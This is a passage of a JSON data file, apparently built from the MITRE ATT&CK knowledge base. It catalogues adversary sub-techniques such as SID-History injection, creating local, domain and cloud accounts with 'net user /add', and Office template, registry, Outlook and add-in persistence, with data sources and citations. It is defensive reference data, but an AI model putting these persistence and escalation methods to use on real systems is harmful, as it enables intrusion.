href=\"https://attack.mitre.org/techniques/T1028\">Windows Remote Management</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft SID",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx",
        "description": "Microsoft. (n.d.). Security Identifiers. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SID-History Attribute",
        "url": "https://msdn.microsoft.com/library/ms679833.aspx",
        "description": "Microsoft. (n.d.). Active Directory Schema - SID-History attribute. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Well Known SIDs Jun 2017",
        "url": "https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems",
        "description": "Microsoft. (2017, June 23). Well-known security identifiers in Windows operating systems. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Get-ADUser",
        "url": "https://technet.microsoft.com/library/ee617241.aspx",
        "description": "Microsoft. (n.d.). Active Directory Cmdlets - Get-ADUser. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity SID History Sept 2015",
        "url": "https://adsecurity.org/?p=1772",
        "description": "Metcalf, S. (2015, September 19). Sneaky Active Directory Persistence #14: SID History. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DsAddSidHistory",
        "url": "https://msdn.microsoft.com/library/ms677982.aspx",
        "description": "Microsoft. (n.d.). Using DsAddSidHistory. Retrieved November 30, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023",
    "platform": "windows",
    "tid": "T1134.005",
    "technique": "SID-History Injection",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|authentication-logs|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).<!-- raw HTML omitted --><!-- raw HTML omitted -->With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as <a href=\"https://attack.mitre.org/techniques/T1021\">Remote Services</a>, <a href=\"https://attack.mitre.org/techniques/T1077\">Windows Admin Shares</a>, or <a href=\"https://attack.mitre.org/techniques/T1028\">Windows Remote Management</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft SID",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx",
        "description": "Microsoft. (n.d.). Security Identifiers. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SID-History Attribute",
        "url": "https://msdn.microsoft.com/library/ms679833.aspx",
        "description": "Microsoft. (n.d.). Active Directory Schema - SID-History attribute. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Well Known SIDs Jun 2017",
        "url": "https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems",
        "description": "Microsoft. (2017, June 23). Well-known security identifiers in Windows operating systems. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Get-ADUser",
        "url": "https://technet.microsoft.com/library/ee617241.aspx",
        "description": "Microsoft. (n.d.). Active Directory Cmdlets - Get-ADUser. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity SID History Sept 2015",
        "url": "https://adsecurity.org/?p=1772",
        "description": "Metcalf, S. (2015, September 19). Sneaky Active Directory Persistence #14: SID History. Retrieved November 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DsAddSidHistory",
        "url": "https://msdn.microsoft.com/library/ms677982.aspx",
        "description": "Microsoft. (n.d.). Using DsAddSidHistory. Retrieved November 30, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--635cbe30-392d-4e27-978e-66774357c762",
    "platform": "linux|macos|windows",
    "tid": "T1136.001",
    "technique": "Local Account",
    "tactic": "persistence",
    "datasources": "authentication-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <!-- raw HTML omitted -->net user /add<!-- raw HTML omitted --> command can be used to create a local account.<!-- raw HTML omitted --><!-- raw HTML omitted -->Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft User Creation Event",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720",
        "description": "Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177",
    "platform": "windows|macos|linux",
    "tid": "T1136.002",
    "technique": "Domain Account",
    "tactic": "persistence",
    "datasources": "authentication-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <!-- raw HTML omitted -->net user /add /domain<!-- raw HTML omitted --> command can be used to create a domain account.<!-- raw HTML omitted --><!-- raw HTML omitted -->Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft User Creation Event",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720",
        "description": "Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a009cb25-4801-4116-9105-80a91cf15c1b",
    "platform": "aws|gcp|azure|office-365|azure-ad",
    "tid": "T1136.003",
    "technique": "Cloud Account",
    "tactic": "persistence",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|office-365-audit-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft O365 Admin Roles",
        "url": "https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide",
        "description": "Ako-Adjei, K., Dickhaus, M., Baumgartner, P., Faigel, D., et. al.. (2019, October 8). About admin roles. Retrieved October 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Support O365 Add Another Admin, October 2019",
        "url": "https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d",
        "description": "Microsoft. (n.d.). Add Another Admin. Retrieved October 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "AWS Create IAM User",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_users_create.html",
        "description": "AWS. (n.d.). Creating an IAM User in Your AWS Account. Retrieved January 29, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GCP Create Cloud Identity Users",
        "url": "https://support.google.com/cloudidentity/answer/7332836?hl=en&ref_topic=7558554",
        "description": "Google. (n.d.). Create Cloud Identity user accounts. Retrieved January 29, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Azure AD Users",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/add-users-azure-active-directory",
        "description": "Microsoft. (2019, November 11). Add or delete users using Azure Active Directory. Retrieved January 30, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--79a47ad0-fc3b-4821-9f01-a026b1ddba21",
    "platform": "windows|office-365",
    "tid": "T1137.001",
    "technique": "Office Template Macros",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)<!-- raw HTML omitted --><!-- raw HTML omitted -->Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) <!-- raw HTML omitted --><!-- raw HTML omitted -->Word Normal.dotm location:<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->C:\\Users&amp;lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Excel Personal.xlsb location:<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->C:\\Users&amp;lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also change the location of the base template to point to their own by hijacking the application’s search order, e.g. Word 2016 will first look for Normal.dotm under <!-- raw HTML omitted -->C:\\Program Files (x86)\\Microsoft Office\\root\\Office16&lt;/code&gt;, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Change Normal Template",
        "url": "https://support.office.com/article/Change-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea",
        "description": "Microsoft. (n.d.). Change the Normal template (Normal.dotm). Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN VBA in Office",
        "url": "https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office",
        "description": "Austin, J. (2017, June 6). Getting Started with VBA in Office. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 normal.dotm",
        "url": "https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/",
        "description": "Nelson, M. (2014, January 23). Maintaining Access with normal.dotm. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Hexacorn Office Template Macros",
        "url": "http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/",
        "description": "Hexacorn. (2017, April 17). Beyond good ol’ Run key, Part 62. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GlobalDotName Jun 2019",
        "url": "https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique",
        "description": "Shukrun, S. (2019, June 2). Office Templates and GlobalDotName - A Stealthy Office Persistence Technique. Retrieved August 26, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "CrowdStrike Outlook Forms",
        "url": "https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746",
        "description": "Parisi, T., et al. (2017, July). Using Outlook Forms for Lateral Movement and Persistence. Retrieved February 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Outlook Today Home Page",
        "url": "https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943",
        "description": "Soutcast. (2018, September 14). Outlook Today Homepage Persistence. Retrieved February 5, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a",
    "platform": "windows|office-365",
    "tid": "T1137.002",
    "technique": "Office Test",
    "tactic": "persistence",
    "datasources": "dll-monitoring|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the Microsoft Office “Office Test” Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)<!-- raw HTML omitted --><!-- raw HTML omitted -->There exist user and global Registry keys for the Office Test feature:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.</p>\n",
    "technique_references": [
      {
        "source_name": "Hexacorn Office Test",
        "url": "http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/",
        "description": "Hexacorn. (2014, April 16). Beyond good ol’ Run key, Part 10. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Office Test Sofacy",
        "url": "https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/",
        "description": "Falcone, R. (2016, July 20). Technical Walkthrough: Office Test Persistence Method Used In Recent Sofacy Attacks. Retrieved July 3, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a9e2cea0-c805-4bf8-9e31-f5f0513a3634",
    "platform": "windows|office-365",
    "tid": "T1137.003",
    "technique": "Outlook Forms",
    "tactic": "persistence",
    "datasources": "mail-server|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)<!-- raw HTML omitted --><!-- raw HTML omitted -->Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)</p>\n",
    "technique_references": [
      {
        "source_name": "SensePost Outlook Forms",
        "url": "https://sensepost.com/blog/2017/outlook-forms-and-shells/",
        "description": "Stalmans, E. (2017, April 28). Outlook Forms and Shells. Retrieved February 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Detect Outlook Forms",
        "url": "https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack",
        "description": "Fox, C., Vangel, D. (2018, April 22). Detect and Remediate Outlook Rules and Custom Forms Injections Attacks in Office 365. Retrieved February 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "SensePost NotRuler",
        "url": "https://github.com/sensepost/notruler",
        "description": "SensePost. (2017, September 21). NotRuler - The opposite of Ruler, provides blue teams with the ability to detect Ruler usage against Exchange. Retrieved February 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bf147104-abf9-4221-95d1-e81585859441",
    "platform": "windows|office-365",
    "tid": "T1137.004",
    "technique": "Outlook Home Page",
    "tactic": "persistence",
    "datasources": "mail-server|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Microsoft Outlook’s Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)<!-- raw HTML omitted --><!-- raw HTML omitted -->Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "SensePost Outlook Home Page",
        "url": "https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/",
        "description": "Stalmans, E. (2017, October 11). Outlook Home Page – Another Ruler Vector. Retrieved February 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Detect Outlook Forms",
        "url": "https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack",
        "description": "Fox, C., Vangel, D. (2018, April 22). Detect and Remediate Outlook Rules and Custom Forms Injections Attacks in Office 365. Retrieved February 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "SensePost NotRuler",
        "url": "https://github.com/sensepost/notruler",
        "description": "SensePost. (2017, September 21). NotRuler - The opposite of Ruler, provides blue teams with the ability to detect Ruler usage against Exchange. Retrieved February 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3d1b9d7e-3921-4d25-845a-7d9f15c0da44",
    "platform": "windows|office-365",
    "tid": "T1137.005",
    "technique": "Outlook Rules",
    "tactic": "persistence",
    "datasources": "mail-server|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)<!-- raw HTML omitted --><!-- raw HTML omitted -->Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)</p>\n",
    "technique_references": [
      {
        "source_name": "SilentBreak Outlook Rules",
        "url": "https://silentbreaksecurity.com/malicious-outlook-rules/",
        "description": "Landers, N. (2015, December 4). Malicious Outlook Rules. Retrieved February 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Detect Outlook Forms",
        "url": "https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack",
        "description": "Fox, C., Vangel, D. (2018, April 22). Detect and Remediate Outlook Rules and Custom Forms Injections Attacks in Office 365. Retrieved February 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "SensePost NotRuler",
        "url": "https://github.com/sensepost/notruler",
        "description": "SensePost. (2017, September 21). NotRuler - The opposite of Ruler, provides blue teams with the ability to detect Ruler usage against Exchange. Retrieved February 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--34f1d81d-fe88-4f97-bd3b-a3164536255d",
    "platform": "windows|office-365",
    "tid": "T1137.006",
    "technique": "Add-ins",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Office Add-ins",
        "url": "https://support.office.com/article/Add-or-remove-add-ins-0af570c4-5cf3-4fa9-9b88-403625a0b460",
        "description": "Microsoft. (n.d.). Add or remove add-ins. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MRWLabs Office Persistence Add-ins",
        "url": "https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/",
        "description": "Knowles, W. (2017, April 21). Add-In Opportunities for Office Persistence. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Mail CDS 2018",
        "url": "https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s03-youve-got-mail.pdf",
        "description": "Caban, D. and Hirani, M. (2018, October 3). You’ve Got Mail! Enterprise Email Compromise. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "GlobalDotName Jun 2019",
        "url": "https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique",
        "description": "Shukrun, S. (2019, June 2). Office Templates and GlobalDotName - A Stealthy Office Persistence Technique. Retrieved August 26, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
    "platform": "linux|macos|windows",
    "tid": "T1195.001",
    "technique": "Compromise Software Dependencies and Development Tools",
    "tactic": "initial-access",
    "datasources": "file-monitoring|web-proxy",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)  <!-- raw HTML omitted --><!-- raw HTML omitted -->Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.</p>\n",
    "technique_references": [
      {
        "source_name": "Trendmicro NPM Compromise",
        "url": "https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets",
        "description": "Trendmicro. (2018, November 29). Hacker Infects Node.js Package to Steal from Bitcoin Wallets. Retrieved April 10, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00",
    "platform": "linux|macos|windows",
    "tid": "T1195.002",
    "technique": "Compromise Software Supply Chain",
    "tactic": "initial-access",
    "datasources": "file-monitoring|web-proxy",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.<!-- raw HTML omitted --><!-- raw HTML omitted -->Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011)</p>\n",
    "technique_references": [
      {
        "source_name": "Avast CCleaner3 2018",
        "url": "https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities",
        "description": "Avast Threat Intelligence Team. (2018, March 8). New investigations into the CCleaner incident point to a possible third stage that had keylogger capacities. Retrieved March 15, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Command Five SK 2011",
        "url": "https://www.commandfive.com/papers/C5_APT_SKHack.pdf",
        "description": "Command Five Pty Ltd. (2011, September). SK Hack by an Advanced Persistent Threat. Retrieved April 6, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef",
    "platform": "linux|macos|windows",
    "tid": "T1195.003",
    "technique": "Compromise Hardware Supply Chain",
    "tactic": "initial-access",
    "datasources": "bios|component-firmware|disk-forensics|efi",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9",
    "platform": "linux|macos|windows",
    "tid": "T1204.001",
    "technique": "Malicious Link",
    "tactic": "execution",
    "datasources": "anti-virus|process-monitoring|web-proxy",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from <a href=\"https://attack.mitre.org/techniques/T1566/002\">Spearphishing Link</a>. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via <a href=\"https://attack.mitre.org/techniques/T1203\">Exploitation for Client Execution</a>. Links may also lead users to download files that require execution via <a href=\"https://attack.mitre.org/techniques/T1204/002\">Malicious File</a>.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
    "platform": "linux|macos|windows",
    "tid": "T1204.002",
    "technique": "Malicious File",
    "tactic": "execution",
    "datasources": "anti-virus|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
